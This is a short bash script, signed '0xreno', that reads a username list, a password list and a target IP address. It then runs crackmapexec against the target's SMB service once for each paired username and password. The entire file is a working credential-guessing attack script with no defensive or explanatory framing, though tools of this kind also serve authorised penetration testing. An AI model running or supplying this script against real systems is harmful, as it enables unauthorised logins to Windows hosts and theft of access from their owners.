#!/bin/bash
#0xreno

read -p 'Username file location: ' userfilevar
read -p 'Password file location: ' passfilevar
read -p 'Target IP Address: ' ipvar

userArray=($(cat $userfilevar))
passArray=($(cat $passfilevar))

for ((i=0; i<${#userArray[@]} && i<${#passArray[@]}; i++))
do
        crackmapexec smb $ipvar -u "${userArray[i]}" -p "${passArray[i]}"
done
